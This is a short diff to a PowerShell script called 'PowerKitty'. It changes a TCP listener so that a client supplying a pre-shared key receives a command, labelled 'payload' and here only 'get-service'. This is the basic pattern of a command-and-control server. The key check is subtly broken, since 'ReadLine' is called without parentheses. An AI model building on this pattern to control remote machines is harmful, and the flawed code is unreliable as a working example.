@@ -74,8 +74,22 @@ Function Global:New-Listerner()
 				
 				$Stream = $C.GetStream()
 				$StreamWriter = New-Object System.IO.StreamWriter($Stream)
-				$StreamWriter.WriteLine("Purr!!!! :)") | Out-Null
+				$StreamReader = New-Object System.IO.StreamReader($Stream)
+
+				# if PSK matches, payload
+				if($StreamReader.ReadLine == $PSK)
+				{
+					$StreamWriter.WriteLine("get-service") | Out-Null
+				}
+				# else, gtfo
+				else
+				{
+					$StreamWriter.WriteLine("PowerKitty: Hisss!!!") | Out-Null
+				}
+
+				
 				$StreamWriter.Close()
+				$StreamReader.Close()
 			})
 
 			$AsyncObject = $PowerShell.BeginInvoke()
